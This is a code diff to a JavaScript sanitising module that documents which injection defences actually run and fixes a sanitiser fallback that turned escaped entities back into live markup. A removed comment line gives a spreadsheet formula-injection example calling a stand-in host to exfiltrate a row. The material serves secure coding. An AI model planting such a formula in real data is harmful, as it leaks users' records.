@@ -5,13 +5,36 @@
  * never assigns `innerHTML`, so a stored string cannot become markup. This
  * file covers the three places where that guarantee does not reach.
  *
- * 1. **Rich text.** Notes store HTML by design. It is parsed and rebuilt from
- *    an allow-list, so a `<script>` or an `onclick` pasted from a web page is
- *    dropped rather than escaped-and-rendered.
- * 2. **Links.** A stored `javascript:` URL is a click away from running.
- * 3. **Spreadsheet cells.** A value beginning `=`, `+`, `-` or `@` is a
- *    formula to Sheets. `=IMPORTXML("evil.example", …)` in a payee name
- *    exfiltrates the row the moment somebody opens the workbook.
+ * 1. **Links.** A stored `javascript:` URL is a click away from running.
+ *    `safeUrl` is wired, in `js/modules/crud.js`.
+ * 2. **CSV export.** `escapeCsv`, wired in `js/reports/csv.js`.
+ * 3. **File names.** `safeFileName`, wired in `js/sync/drive.js` and
+ *    `js/reports/build.js`.
+ *
+ * ## What is here and is *not* wired, said plainly
+ *
+ * This header used to list rich text and spreadsheet cells as things "this
+ * file covers". Neither was true, and a security file describing a defence
+ * that does not run is worse than one that admits a gap.
+ *
+ *   - `sanitizeHtml` and `stripTags` have **no caller**. Nothing renders
+ *     stored HTML: `richtext` is edited in a plain `<textarea>` and drawn as a
+ *     text node, and `tools/lint.mjs` refuses any assignment to `innerHTML` in
+ *     what ships, which `tests/modules.test.mjs` proves fires. That structural
+ *     rule is the real defence and it is stronger than sanitising. These stay
+ *     for the day something does render markup — unwired, and now labelled.
+ *
+ *     They are also not interchangeable, which is how the no-DOM branch of
+ *     `sanitizeHtml` came to return live markup: `stripTags` **decodes**
+ *     entities on the way out, so `&lt;script&gt;` became `<script>`. That is
+ *     right for extraction and wrong for a sanitiser, and it is the reason
+ *     `escapeHtml` exists below.
+ *   - `escapeForSheet` and `unescapeFromSheet` have **no caller either**. The
+ *     formula-injection defence that actually runs is `defuse()` in
+ *     `apps-script/Sheets.gs`, on the server, whose own comment used to call
+ *     itself "the second line" of a defence whose first line was never built.
+ *     It is the only line, and `tests/backend.test.mjs` now tests it through
+ *     the deployed `.gs` rather than through these functions.
  */
 
 const ALLOWED_TAGS = new Set([
@@ -47,7 +70,15 @@ export function safeUrl(value) {
  * evasion; an allow-list only has to know what notes are permitted to contain.
  */
 export function sanitizeHtml(html, doc = globalThis.document) {
-  if (!doc) return stripTags(html);
+  // Without a DOM there is no parser, so there is no way to do the job this
+  // function's name promises. It used to fall back to `stripTags`, which is a
+  // *text extractor*: it removes tags and then decodes entities, so
+  // `&lt;script&gt;` came back out as `<script>` — live markup, returned by a
+  // sanitiser, in the one context where nothing had parsed it. `stripTags` is
+  // right for what it is for; this was the wrong caller for it. Escaped
+  // instead, because every return of this function has to be safe to treat as
+  // HTML or the name is a lie.
+  if (!doc) return escapeHtml(html);
 
   const parsed = new DOMParser().parseFromString(String(html ?? ''), 'text/html');
   const out = doc.createDocumentFragment();
@@ -96,7 +127,24 @@ function cleanNode(node, doc) {
   return el;
 }
 
-/** Fallback when there is no DOM (report generation, tests). */
+/** The five characters that turn text into markup. */
+export function escapeHtml(text) {
+  return String(text ?? '')
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;');
+}
+
+/**
+ * Readable text out of markup, for reports — **not** a sanitiser.
+ *
+ * It decodes entities on the way out, which is right when the result is
+ * destined for a PDF or a spreadsheet cell and wrong every other way: the
+ * output can contain `<` and `>` and is not safe to treat as HTML. Named and
+ * documented as extraction so nothing reaches for it as a defence again.
+ */
 export function stripTags(html) {
   return String(html ?? '')
     .replace(/<script[\s\S]*?<\/script>/gi, '')
